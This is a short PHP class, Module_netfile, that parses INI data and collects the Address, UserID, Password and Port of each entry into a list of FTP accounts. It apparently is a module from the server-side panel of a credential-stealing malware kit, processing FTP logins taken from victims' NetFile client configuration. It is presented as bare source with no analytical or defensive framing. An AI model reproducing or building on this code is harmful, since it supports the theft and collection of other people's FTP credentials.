<?php
//ok
class Module_netfile extends Module_
{
    protected function ProcessNETFile($Source)
    {
        if (strlen($Source) <= 4)
            return;

        $INI_ = parse_ini($Source);
		if($INI_ == NULL)
			return;
		
        foreach ($INI_ as $Section)
        {
            if (!is_array($Section))
                continue;
			
            $Host = Assign_($Section["Address"]);
            $User = Assign_($Section["UserID"]);
            $Pass = Assign_($Section["Password"]);
            $Port = Assign_($Section["Port"]);
			
            $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
        }
		$INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessNETFile($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

